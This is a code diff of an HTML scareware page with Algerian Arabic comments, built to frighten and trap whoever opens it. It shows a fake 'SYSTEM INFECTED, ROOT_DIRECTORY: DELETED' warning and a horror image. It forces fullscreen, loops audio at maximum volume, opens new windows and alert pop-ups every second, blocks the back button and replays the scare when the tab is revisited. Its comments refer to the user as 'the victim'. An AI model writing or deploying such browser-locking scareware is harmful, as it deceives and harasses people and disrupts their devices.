@@ -3,74 +3,66 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SYSTEM_CRITICAL_LOCK_V2</title>
+    <title>⚠️ SYSTEM_CRITICAL_LOCK ⚠️</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; cursor: none; }
-        #horrorImg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 9999; display: none; }
-        #terminal { color: #f00; text-align: center; padding-top: 40vh; font-family: monospace; font-size: 25px; }
-        .blink { animation: blinker 0.2s linear infinite; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; }
+        #horrorImg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 999; display: none; }
+        #messageBox { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 9999; color: #f00; text-align: center; font-family: 'Courier New', monospace; font-weight: bold; background: rgba(0,0,0,0.8); padding: 20px; border: 5px solid #f00; display: none; width: 80%; }
+        .blink { animation: blinker 0.1s linear infinite; }
         @keyframes blinker { 50% { opacity: 0; } }
     </style>
 </head>
 <body onclick="activateVirus()">
 
-    <div id="terminal">
-        <div class="blink">⚠️ SYSTEM BREACH DETECTED ⚠️</div>
-        <div id="count">10</div> 
-        <div style="font-size: 14px; color: #0ff;">DELETING_INTERNAL_STORAGE...</div>
+    <div id="messageBox" class="blink">
+        <h1>⚠️ SYSTEM INFECTED ⚠️</h1>
+        <p>نظامك مات سواسوة.. الضحك خلاص درك!</p>
+        <p style="font-size: 12px;">ROOT_DIRECTORY: DELETED</p>
     </div>
 
     <img id="horrorImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
     <audio id="sfx" src="tfy-krk.mp3" preload="auto" loop></audio>
 
     <script>
-        let seconds = 10;
         let running = false;
         const audio = document.getElementById('sfx');
+        const msg = document.getElementById('messageBox');
         const img = document.getElementById('horrorImg');
-
-        // منع الرجوع سواسوة
-        history.pushState(null, null, location.href);
-        window.onpopstate = () => history.go(1);
 
         function activateVirus() {
             if (running) return;
             running = true;
-            
-            // طلب الشاشة الكاملة سواسوة
             document.documentElement.requestFullscreen().catch(() => {});
             
-            let timer = setInterval(() => {
-                seconds--;
-                document.getElementById('count').innerText = seconds;
-                if (seconds <= 0) {
-                    clearInterval(timer);
-                    bombardSystem();
-                }
+            // إجبارية الصوت بأعلى درجة سواسوة
+            audio.volume = 1.0; 
+            audio.play();
+            img.style.display = 'block';
+            msg.style.display = 'block';
+
+            // ميزة العودة التلقائية والإزعاج كل ثانية سواسوة
+            setInterval(() => {
+                // فتح تبويبات جديدة لمنع الخروج سواسوة
+                window.open(window.location.href, '_blank', 'width=10,height=10');
+                
+                // تنبيهات مزعجة سواسوة
+                alert("⚠️ طفي كراك.. راك محبوس سواسوة!");
+                
+                if(audio.paused) audio.play();
             }, 1000);
         }
 
-        function bombardSystem() {
-            document.getElementById('terminal').style.display = 'none';
-            img.style.display = 'block';
-            audio.volume = 1.0;
-            audio.play();
+        // ميزة إعادة الدخول: كل ما يرجع الضحية للمتصفح يلقى الفيروس يستنى سواسوة
+        document.addEventListener("visibilitychange", () => {
+            if (document.visibilityState === 'visible' && running) {
+                audio.play();
+                alert("⚠️ وين راك هارب؟ النظام تفيروسا خلاص سواسوة!");
+            }
+        });
 
-            // الميزة لي طلبتها: تحديث وفتح تبويبات كل ثانية سواسوة
-            setInterval(() => {
-                // فتح صفحة جديدة لإرباك التيليفون سواسوة
-                window.open(window.location.href, '_blank', 'width=10,height=10');
-                
-                // إعادة تشغيل الصوت إذا حبس سواسوة
-                if(audio.paused) audio.play();
-                
-                // تنبيه لإجبار المستخدم على التفاعل سواسوة
-                console.log("Hacked by Alge-Hacker...");
-            }, 1000); 
-
-            // منع الخروج سواسوة
-            window.onbeforeunload = () => { return "راك محبوس سواسوة!"; };
-        }
+        // منع زر الرجوع سواسوة
+        history.pushState(null, null, location.href);
+        window.onpopstate = () => history.go(1);
     </script>
 </body>
 </html>
